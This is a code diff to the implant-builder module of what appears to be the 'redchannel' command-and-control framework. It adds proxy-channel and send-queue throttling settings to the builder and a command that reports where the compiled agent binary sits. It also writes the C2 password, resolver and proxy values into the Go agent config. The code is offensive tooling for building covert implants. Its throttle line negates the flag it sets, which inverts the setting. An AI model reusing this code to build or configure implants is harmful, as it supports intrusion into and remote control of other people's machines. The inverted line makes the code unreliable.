@@ -22,6 +22,10 @@ export type ImplantModuleConfig = {
     resolver: string;
     interval: number;
     debug: boolean;
+    proxy_url: string;
+    proxy_enabled: boolean;
+    proxy_key: string;
+    throttle_sendq: boolean;
 };
 
 export default class ImplantModule extends BaseModule {
@@ -40,13 +44,19 @@ export default class ImplantModule extends BaseModule {
 
         this.log = new Logger();
 
-        this.config = this.resetConfig({
+        const defaultConfig: ImplantModuleConfig = {
             os: "windows",
             arch: "amd64",
             interval: 5000,
             resolver: "8.8.8.8:53",
+            proxy_enabled: false,
+            proxy_key: "redchannel",
+            proxy_url: "",
+            throttle_sendq: true,
             debug: false,
-        });
+        };
+
+        this.config = this.resetConfig(defaultConfig);
 
         this.outputFile = "";
 
@@ -63,6 +73,14 @@ export default class ImplantModule extends BaseModule {
                 arguments: [],
                 description: "show the build log",
                 execute: this.getLog,
+            },
+            payload: {
+                arguments: [],
+                description: "get the binary location on disk",
+                execute: () => {
+                    if (!this.outputFile) return { message: "agent binary not built yet, see 'build'" };
+                    return { message: `agent binary can be found here: ${this.outputFile}` };
+                },
             },
             "set os": {
                 arguments: ["<windows|linux|darwin|...>"],
@@ -90,10 +108,39 @@ export default class ImplantModule extends BaseModule {
             },
             "set resolver": {
                 arguments: ["<ip:port>"],
-                description: "set implant resolver ip:port (8.8.8.8:53)",
+                description: "set implant resolver ip:port (8.8.8.8:53) to use for dns channel",
                 validateRegex: Constants.VALID_IMPLANT_RESOLVER,
                 execute: (params: string) => {
                     this.config.resolver = params;
+                },
+            },
+            "set throttle_sendq": {
+                arguments: ["<1|0>"],
+                description: "throttle c2 communication (enable) or just send it all at once (disable)",
+                execute: (params: string) => {
+                    this.config.throttle_sendq = params != "0" && params != "false" ? true : false;
+                },
+            },
+            "set proxy_url": {
+                arguments: ["<url>"],
+                description: "set the proxy url to use (http://proxy.domain.tld/proxy.php)",
+                validateRegex: Constants.VALID_URL_REGEX,
+                execute: (params: string) => {
+                    this.config.proxy_url = params;
+                },
+            },
+            "set proxy_enabled": {
+                arguments: ["<1|0>"],
+                description: "enable or disable proxy communication (web channel)",
+                execute: (params: string) => {
+                    this.config.proxy_enabled = params != "0" && params != "false" ? true : false;
+                },
+            },
+            "set proxy_key": {
+                arguments: ["<key>"],
+                description: "key to use for proxy communication",
+                execute: (params: string) => {
+                    this.config.proxy_key = params;
                 },
             },
             "set debug": {
@@ -137,7 +184,7 @@ export default class ImplantModule extends BaseModule {
             GOOS: targetOs,
             GOARCH: targetArch,
             GO111MODULE: "auto",
-            GOCACHE: path.join(os.tmpdir(), "rc-build-cache"), // 'go cache clean' after build?
+            GOCACHE: path.join(os.tmpdir(), "rc-build-cache"), // 'go clean -modcache' after build?
             GOPATH: path.join(os.tmpdir(), "rc-build-path"),
             PATH: process.env.PATH,
         };
@@ -220,11 +267,10 @@ export default class ImplantModule extends BaseModule {
         configData = configData.replace(/^\s*c\.C2Password\s*=\s*\".*\".*$/im, `c.C2Password = "${this.redChannel.plaintextPassword}"`);
         configData = configData.replace(/^\s*c\.Resolver\s*=\s*\".*\".*$/im, `c.Resolver = "${this.config.resolver}"`);
         configData = configData.replace(/^\s*c\.C2Interval\s*=.*$/im, `c.C2Interval = ${this.config.interval}`);
-        configData = configData.replace(/^\s*c\.ProxyEnabled\s*=.*$/im, `c.ProxyEnabled = ${this.redChannel.modules.proxy.config.enabled}`);
-        configData = configData.replace(/^\s*c\.ProxyUrl\s*=\s*\".*\".*$/im, `c.ProxyUrl = "${this.redChannel.modules.proxy.config.url}"`);
-        configData = configData.replace(/^\s*c\.ProxyKey\s*=\s*\".*\".*$/im, `c.ProxyKey = "${this.redChannel.modules.proxy.config.key}"`);
-        // if we are in debug mode, don't throttle sendq
-        configData = configData.replace(/^\s*c\.ThrottleSendQ\s*=.*$/im, `c.ThrottleSendQ = ${!this.config.debug}`);
+        configData = configData.replace(/^\s*c\.ProxyEnabled\s*=.*$/im, `c.ProxyEnabled = ${this.config.proxy_enabled}`);
+        configData = configData.replace(/^\s*c\.ProxyUrl\s*=\s*\".*\".*$/im, `c.ProxyUrl = "${this.config.proxy_url}"`);
+        configData = configData.replace(/^\s*c\.ProxyKey\s*=\s*\".*\".*$/im, `c.ProxyKey = "${this.config.proxy_key}"`);
+        configData = configData.replace(/^\s*c\.ThrottleSendQ\s*=.*$/im, `c.ThrottleSendQ = ${!this.config.throttle_sendq}`);
 
         try {
             fs.writeFileSync(agentConfigPath, configData, { flag: "w" });
